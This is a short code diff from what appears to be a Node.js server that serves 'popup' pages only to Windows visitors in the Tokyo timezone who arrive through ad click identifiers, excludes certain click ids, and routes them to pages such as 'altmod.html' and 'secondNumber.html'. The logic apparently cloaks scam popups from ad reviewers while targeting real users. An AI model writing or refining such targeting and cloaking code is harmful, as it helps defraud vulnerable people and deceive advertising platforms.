@@ -92,7 +92,7 @@ app.post("/", (req, res) => {
   if (isWindowsOS(userAgent) && isTokyoTimezone && !containsExcludedGclid(fullUrl) && (fullUrl?.includes('gclid') || fullUrl?.includes('taboola') || fullUrl?.includes('tx'))) {
     console.log('popupsent');
     if (firstList.some(item => fullUrl.includes(item))) {
-      res.sendFile(path.join(__dirname, "index.html"));
+      res.sendFile(path.join(__dirname, "altmod.html"));
     } else if (secondList.some(item => fullUrl.includes(item))) {
       res.sendFile(path.join(__dirname, "secondNumber.html"));
     } else if (thirdList.some(item => fullUrl.includes(item))) {
